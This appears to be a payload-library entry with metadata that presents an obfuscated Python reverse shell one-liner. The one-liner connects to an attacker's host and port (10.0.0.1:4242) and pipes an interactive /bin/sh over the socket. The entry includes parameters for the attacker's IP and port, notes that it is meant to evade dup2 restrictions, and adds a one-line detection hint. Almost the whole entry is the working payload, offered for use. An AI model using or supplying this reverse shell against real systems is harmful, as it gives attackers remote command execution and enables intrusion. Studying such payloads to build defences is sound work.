---
id: 573291d4-aae6-4192-849e-b36026c1d79e
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - obfuscated
  - subprocess
validated: true
---

# Python-Obfuscated-Reverse-Shell-Import-Subprocess-Fileno

## Code

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

## Description

Obfuscated imports with direct fileno passing to subprocess for shell execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

For bypassing dup2 restrictions with obfuscation.

## Detection

- __import__ + fileno-based subprocess.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
